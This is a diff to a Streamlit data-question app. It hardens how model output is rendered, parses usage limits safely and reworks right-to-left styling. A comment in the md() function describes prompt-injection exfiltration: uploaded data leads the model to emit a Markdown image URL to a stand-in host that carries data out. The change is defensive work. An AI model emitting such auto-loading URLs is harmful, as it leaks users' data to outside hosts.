@@ -35,7 +35,14 @@ def esc(text):
     return (str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))
 DEMO = os.environ.get("DEMO", "").lower() in ("1", "true", "yes")
 # A public demo (question limits set): nothing a visitor does is written to the shared server, e.g. dashboards.
-PUBLIC = any(os.environ.get(k, "0") not in ("", "0") for k in ("QUESTION_LIMIT", "DAILY_LIMIT"))
+def _limit(name):
+    try:
+        return max(int(os.environ.get(name, "0") or 0), 0)
+    except ValueError:
+        return 0
+
+
+PUBLIC = bool(_limit("QUESTION_LIMIT") or _limit("DAILY_LIMIT"))
 UPLOAD_TYPES = ["csv", "txt", "tsv", "xlsx", "xlsm", "xls", "sql", "sqlite", "sqlite3", "db"]
 
 
@@ -76,6 +83,7 @@ def sync_upload():
             st.session_state.upload_error = str(e)
 
 
+st.session_state["_rtl_n"] = 0          # md() numbers its right-to-left blocks from the top on every run
 if not DEMO:
     sweep_old_uploads()
     sync_upload()
@@ -178,8 +186,9 @@ st.html("""
 .stat-value { font-size: 2rem; font-weight: 600; color: var(--slate); line-height: 1.2; }
 .stat-caption { color: var(--steel); font-size: .78rem; unicode-bidi: plaintext; }
 .dash-title { font-weight: 600; color: var(--slate); unicode-bidi: plaintext; text-align: start; margin-bottom: .3rem; }
-.rtl, .rtl p, .rtl li, [class*="st-key-rtl-"] p, [class*="st-key-rtl-"] li { direction: rtl; text-align: right; unicode-bidi: normal; }
-.rtl ul, .rtl ol, [class*="st-key-rtl-"] ul, [class*="st-key-rtl-"] ol { padding-right: 1.4rem; padding-left: 0; }
+[class*="st-key-rtl-"] { direction: rtl; text-align: right; }
+[class*="st-key-rtl-"] ul, [class*="st-key-rtl-"] ol { padding-right: 1.4rem; padding-left: 0; }
+[class*="st-key-rtl-"] pre, [class*="st-key-rtl-"] code { direction: ltr; text-align: left; }   /* code stays left-to-right */
 </style>
 """)
 
@@ -363,12 +372,17 @@ def is_hebrew(text):
     return False
 
 
+IMAGE = re.compile(r"!(\[[^\]]*\])")
+
+
 def md(text):
-    """Markdown that flips to right-to-left (bullets included) when the text is Hebrew."""
+    """Model text as Markdown - right-to-left when it is Hebrew - with nothing in it that loads by itself."""
+    # No HTML is rendered, and no images: ![](https://x/?d=...) would make the browser fetch that address on its own,
+    # carrying whatever an uploaded file got the model to put in it. Shown as a plain link instead (needs a click).
+    text = IMAGE.sub(r"\1", text or "")
     if is_hebrew(text):
-        # The wrapper div needs HTML on; the text itself must not carry any (it can come from uploaded data)
-        # Right-to-left by a CSS rule on a keyed container - no HTML rendering at all, so nothing in the text
-        # (which can come from uploaded data) can become markup.
+        # Right-to-left by a CSS rule on a keyed container. The key follows the order of the texts on the page, so it
+        # stays the same from one run to the next and nothing is redrawn needlessly.
         st.session_state["_rtl_n"] = st.session_state.get("_rtl_n", 0) + 1
         with st.container(key=f"rtl-{st.session_state['_rtl_n']}"):
             st.markdown(text)
@@ -832,8 +846,8 @@ for n, item in enumerate(st.session_state.history):
         show_result(item["run"], question=item["question"], key=f"{st.session_state.get('chat_id', 0)}-{n}")
 
 # A public demo spends the owner's API credit: cap questions per visitor and per day (off unless set in the env).
-SESSION_LIMIT = int(os.environ.get("QUESTION_LIMIT", "0") or 0)
-DAILY_LIMIT = int(os.environ.get("DAILY_LIMIT", "0") or 0)
+SESSION_LIMIT = _limit("QUESTION_LIMIT")
+DAILY_LIMIT = _limit("DAILY_LIMIT")
 
 
 @st.cache_resource
